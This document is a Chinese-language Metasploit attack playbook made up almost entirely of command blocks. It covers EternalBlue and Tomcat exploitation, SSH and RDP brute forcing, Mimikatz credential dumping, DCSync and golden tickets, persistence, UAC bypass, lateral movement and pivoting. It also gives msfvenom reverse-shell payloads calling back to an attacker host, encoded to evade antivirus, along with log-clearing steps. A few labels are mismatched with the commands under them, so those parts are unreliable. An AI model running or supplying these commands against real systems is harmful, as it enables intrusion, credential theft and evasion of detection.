# Metasploit Framework 实战指南 2025

## 一、MSF快速启动与配置

### 1. 安装与初始化
```bash
# 安装MSF
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash

# 初始化数据库
msfdb init
msfdb start

# 启动MSF
msfconsole

# 检查数据库连接
db_status
```

### 2. 基础配置
```bash
# 设置LHOST（自动）
setg LHOST 10.10.10.10
setg LPORT 4444

# 保存配置
save
```

## 二、内网扫描模块（实战）

### 1. 端口扫描
```bash
# TCP扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,3306,3389,445,5985,6379,27017
set THREADS 50
run

# SYN扫描（更快）
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 100
run
```

### 2. 服务识别
```bash
# SMB版本
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# SSH版本
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP服务
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run
```

### 3. 漏洞扫描
```bash
# MS17-010（永恒之蓝）
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# CVE-2021-44228（Log4j）
use auxiliary/scanner/http/log4shell_scanner
set RHOSTS 192.168.1.0/24
set TARGETURI /
run
```

## 三、漏洞利用（Exploit）

### 1. 永恒之蓝（MS17-010）
```bash
# 扫描
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run

# 利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# 后台运行
exploit -z
```

### 2. SSH爆破
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
set STOP_ON_SUCCESS true
run
```

### 3. RDP爆破
```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/rdp/rdp_login
set RHOSTS 192.168.1.0/24
set USERNAME administrator
set PASS_FILE passwords.txt
set THREADS 5
run
```

### 4. Web漏洞利用
```bash
# SQL注入
use auxiliary/admin/http/tomcat_administration
set RHOSTS 192.168.1.100
set RPORT 8080
set USERNAME admin
set PASS_FILE passwords.txt
run

# 文件上传
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.100
set RPORT 8080
set HttpUsername admin
set HttpPassword admin
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit
```

## 四、Meterpreter后渗透（核心）

### 1. 基础命令
```bash
# 系统信息
sysinfo
getuid
getprivs
getpid
getenv

# 网络信息
ipconfig
route
portfwd add -l 3389 -p 3389 -r 192.168.1.100

# 进程管理
ps
migrate <PID>
kill <PID>
```

### 2. 文件操作
```bash
# 文件系统
pwd
cd C:\\
ls
cat file.txt
download file.txt
upload /tmp/shell.exe C:\\Windows\\Temp\\
edit file.txt

# 搜索文件
search -f *.txt
search -d C:\\Users -f *.key
```

### 3. 凭证收集
```bash
# Windows哈希
hashdump
run hashdump

# Mimikatz（Kiwi）
load kiwi
kiwi_cmd "privilege::debug"
kiwi_cmd "sekurlsa::logonpasswords"
kiwi_cmd "lsadump::sam"
kiwi_cmd "lsadump::secrets"

# 凭证管理器
run windows/gather/credentials/windows_autologin
run windows/gather/credentials/credential_collector
```

### 4. 持久化
```bash
# Meterpreter持久化
run persistence -X -i 60 -p 4444 -r 10.10.10.10
# -X: 开机自启
# -i: 心跳间隔（秒）
# -p: 监听端口
# -r: 回连IP

# 服务持久化
run metsvc

# 计划任务
run scheduleme -m 1 -e /tmp/payload.exe
```

### 5. 权限提升
```bash
# 自动提权
getsystem

# UAC绕过
run post/windows/escalate/uac
run post/windows/escalate/droplnk

# 服务提权
run post/windows/escalate/service_permissions
```

### 6. 横向移动
```bash
# PSEXEC
psexec -u administrator -p password 192.168.1.101

# WMI
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.101
set SMBUser administrator
set SMBPass password
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# WinRM
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 192.168.1.101
set USERNAME administrator
set PASSWORD password
set FORCE_VBS true
exploit
```

## 五、MSF路由（内网穿透核心）

### 1. 添加路由
```bash
# 自动路由
run autoroute -s 192.168.1.0/24
run autoroute -s 10.0.0.0/8

# 手动路由
route add 192.168.1.0 255.255.255.0 1
route print

# 查看路由
route
```

### 2. 通过路由扫描
```bash
# 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set ROUTE_THROUGH_SESSION 1
set PORTS 445,3389,5985
run

# SMB扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set ROUTE_THROUGH_SESSION 1
run
```

### 3. SOCKS代理
```bash
# 启动SOCKS代理
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run

# 配置proxychains
# /etc/proxychains.conf
# socks5 127.0.0.1 1080

# 使用代理
proxychains nmap -sT -Pn 192.168.1.100
proxychains ssh root@192.168.1.100
```

### 4. 端口转发
```bash
# 本地端口转发
portfwd add -l 3389 -p 3389 -r 192.168.1.100
# 访问: rdesktop 127.0.0.1:3389

# 远程端口转发
portfwd add -R -l 8080 -p 80 -r 127.0.0.1
# 将目标80端口转发到本地8080
```

## 六、MSF Handler（接收反弹）

### 1. 启动Handler
```bash
# 快速启动
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit -j"

# 交互式启动
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit -j

# 查看jobs
jobs
jobs -K  # 杀死所有jobs
```

### 2. 生成Payload
```bash
# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o shell.dll

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp -o shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.jsp

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f psh -o shell.ps1

# 免杀（编码）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe
```

### 3. 多Handler管理
```bash
# 启动多个handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit -j

set LPORT 4445
exploit -j

set LPORT 4446
exploit -j

# 查看sessions
sessions -l
sessions -i 1
sessions -k 1  # 杀死session
```

## 七、MSF自动化脚本

### 1. 资源文件
```bash
# 创建资源文件
cat > /tmp/auto_exploit.rc <<EOF
# 设置全局变量
setg LHOST 10.10.10.10
setg LPORT 4444

# 启动handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -j

# 扫描内网
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 445,3389,5985
set THREADS 50
run

# 利用永恒之蓝
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit -z
EOF

# 执行资源文件
msfconsole -r /tmp/auto_exploit.rc
```

### 2. 自动化横向
```bash
cat > /tmp/lateral.rc <<EOF
# 获取session后执行
sessions -i 1
run autoroute -s 192.168.1.0/24

# 通过路由扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set ROUTE_THROUGH_SESSION 1
run

# 批量利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.101
exploit -z

set RHOSTS 192.168.1.102
exploit -z
EOF
```

## 八、MSF Post模块（后渗透）

### 1. 信息收集
```bash
# 系统信息
run post/windows/gather/enum_domain
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp

# 网络信息
run post/windows/gather/enum_tcp_connections
run post/windows/gather/enum_arp
```

### 2. 凭证收集
```bash
# Windows凭证
run post/windows/gather/credentials/windows_autologin
run post/windows/gather/credentials/credential_collector
run post/windows/gather/smart_hashdump

# 浏览器凭证
run post/windows/gather/credentials/browser_autopwn
```

### 3. 权限提升
```bash
# UAC绕过
run post/windows/escalate/uac
run post/windows/escalate/droplnk

# 服务提权
run post/windows/escalate/service_permissions
```

### 4. 持久化
```bash
# 计划任务
run post/windows/manage/persistence_exe

# 服务持久化
run post/windows/manage/persistence_service
```

## 九、MSF实战场景

### 场景1：外网打点→内网横向
```bash
# 1. 外网漏洞利用
use exploit/windows/http/tomcat_mgr_upload
set RHOSTS 1.2.3.4
set HttpUsername admin
set HttpPassword admin
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit

# 2. 获取session
sessions -i 1

# 3. 信息收集
sysinfo
ipconfig
run post/windows/gather/enum_domain

# 4. 添加路由
run autoroute -s 192.168.1.0/24

# 5. 内网扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set ROUTE_THROUGH_SESSION 1
run

# 6. 横向移动
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set ROUTE_THROUGH_SESSION 1
exploit
```

### 场景2：域环境攻击
```bash
# 1. 获取初始立足点
# （同上）

# 2. 域信息收集
run post/windows/gather/enum_domain
run post/windows/gather/enum_domain_group_users

# 3. 凭证收集
load kiwi
kiwi_cmd "lsadump::dcsync /domain:domain.local /user:krbtgt"

# 4. 黄金票据
kiwi_cmd "kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /user:administrator /id:500 /ptt"

# 5. 域控访问
psexec -u administrator -p password 192.168.1.1
```

### 场景3：批量利用
```bash
# 1. 扫描漏洞
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# 2. 批量利用（脚本）
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444

# 遍历目标
hosts -R
exploit -z
```

## 十、MSF技巧与优化

### 1. 性能优化
```bash
# 多线程
set THREADS 50

# 超时设置
set TIMEOUT 5

# 并发exploit
exploit -z  # 后台运行
```

### 2. 隐蔽性
```bash
# 编码payload
msfvenom -e x86/shikata_ga_nai -i 10

# 延迟执行
set DELAY 5

# 随机化
set EnableStageEncoding true
```

### 3. 日志管理
```bash
# 关闭日志
set LogLevel 0

# 清除历史
history -c
```

## 十一、常用命令速查

```bash
# 搜索模块
search ms17-010
search type:exploit platform:windows

# 查看模块信息
info exploit/windows/smb/ms17_010_eternalblue
show options
show payloads

# 设置参数
set RHOSTS 192.168.1.100
setg LHOST 10.10.10.10

# 执行
exploit
exploit -j  # 后台
exploit -z  # 后台+自动路由

# Session管理
sessions -l
sessions -i 1
sessions -k 1

# 路由管理
route
route add 192.168.1.0 255.255.255.0 1
run autoroute -s 192.168.1.0/24

# 后台任务
jobs
jobs -K
```
